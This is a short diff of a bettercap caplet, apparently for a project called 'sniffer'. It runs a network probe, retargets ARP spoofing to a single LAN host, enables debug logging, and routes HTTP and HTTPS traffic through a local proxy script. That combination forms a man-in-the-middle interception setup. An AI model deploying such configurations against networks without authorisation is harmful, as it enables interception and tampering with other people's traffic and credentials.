@@ -3,8 +3,9 @@ net.probe on
 sleep 1
 net.probe off
 
-set arp.spoof.targets 192.168.0.1, 192.168.0.100
-set arp.spoof.targets 192.168.0.100, 192.168.0.1
+set $ {reset}
+set log.debug true
+set arp.spoof.targets 192.168.0.105
 
 set http.proxy.script /home/$USER/sniffer/src/script.js
 set https.proxy.script /home/$USER/sniffer/src/script.js
